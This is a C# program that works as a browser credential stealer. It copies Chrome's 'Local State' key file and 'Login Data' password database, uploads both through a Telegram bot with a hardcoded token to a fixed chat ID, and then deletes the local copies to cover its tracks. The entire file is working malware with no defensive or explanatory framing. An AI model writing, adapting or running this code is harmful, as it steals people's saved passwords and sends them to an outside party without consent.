using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot;
using System.IO;
using Telegram.Bot.Types.InputFiles;

namespace teleuplo
{
    class Program
    {
        static async Task Main(string[] args)
        {
            var lca = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)+ @"\Google\Chrome\User Data\";
            File.Copy(lca + "Local State",@"D:\lca");
            File.Copy(lca + @"Default\Login Data", @"D:\lga");
            var botClient = new TelegramBotClient("1579439514:AAG-9bwOYmiHv5mEKNUGjeBBvJOmFXrwusc");
            using (FileStream fs = System.IO.File.OpenRead(@"D:\lca"))
            {
                InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, "lca");
                await botClient.SendDocumentAsync("1389648270", inputOnlineFile);
                File.Delete(@"D:\lca");
            }
            using (FileStream fs = System.IO.File.OpenRead(@"D:\lga"))
            {
                InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, "lga");
                await botClient.SendDocumentAsync("1389648270", inputOnlineFile);
                File.Delete(@"D:\lga");
            }
        }
    }
}
